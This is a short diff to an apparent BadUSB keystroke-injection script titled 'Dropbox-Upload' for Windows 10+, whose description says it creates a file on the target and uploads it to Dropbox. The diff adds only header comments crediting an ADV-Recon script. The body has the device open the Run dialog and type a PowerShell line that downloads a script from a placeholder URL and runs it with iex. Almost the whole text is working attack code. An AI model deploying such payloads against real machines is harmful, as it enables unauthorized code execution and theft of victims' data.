@@ -1,5 +1,9 @@
+REM Title: Dropbox-Upload
+REM Author: Web Mancha
+REM Description: Creates a file on the target and uploads it to Dropbox
+REM Target: Windows 10+
+REM Props: https://github.com/I-Am-Jakoby for the ADV-Recon script
 GUI r
 DELAY 500
 ALTSTRING cmd /c powershell iex ((New-Object System.Net.WebClient).DownloadString('<SCRIPT_DOWNLOAD_URL>'))
 ENTER
-REM 
